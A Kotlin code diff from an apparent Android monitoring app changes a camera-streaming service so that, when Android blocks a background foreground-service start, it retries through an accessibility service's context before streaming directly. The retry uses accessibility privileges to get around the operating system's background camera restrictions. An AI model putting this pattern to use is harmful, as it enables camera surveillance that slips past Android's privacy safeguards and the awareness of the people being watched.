@@ -43,12 +43,28 @@ class CameraStreamService : Service() {
                     context.startService(intent)
                 }
             } catch (e: Exception) {
-                Log.w(TAG, "startForegroundService restricted, starting CameraStreamManager directly: ${e.message}")
-                val state = DeviceState(context)
-                val authToken = state.authToken
-                val deviceId = state.getEffectiveDeviceId()
-                if (authToken != null && deviceId != null) {
-                    CameraStreamManager.startStreaming(context, authToken, deviceId, lens)
+                Log.w(TAG, "startForegroundService on base context restricted: ${e.message}, attempting via AccessibilityService context")
+                val a11y = com.spapp.monitoring.blocking.BlockAccessibilityService.instance
+                var startedViaA11y = false
+                if (a11y != null) {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            a11y.startForegroundService(intent)
+                        } else {
+                            a11y.startService(intent)
+                        }
+                        startedViaA11y = true
+                    } catch (a11yErr: Exception) {
+                        Log.w(TAG, "Accessibility context startForegroundService also failed: ${a11yErr.message}")
+                    }
+                }
+                if (!startedViaA11y) {
+                    val state = DeviceState(context)
+                    val authToken = state.authToken
+                    val deviceId = state.getEffectiveDeviceId()
+                    if (authToken != null && deviceId != null) {
+                        CameraStreamManager.startStreaming(context, authToken, deviceId, lens)
+                    }
                 }
             }
         }
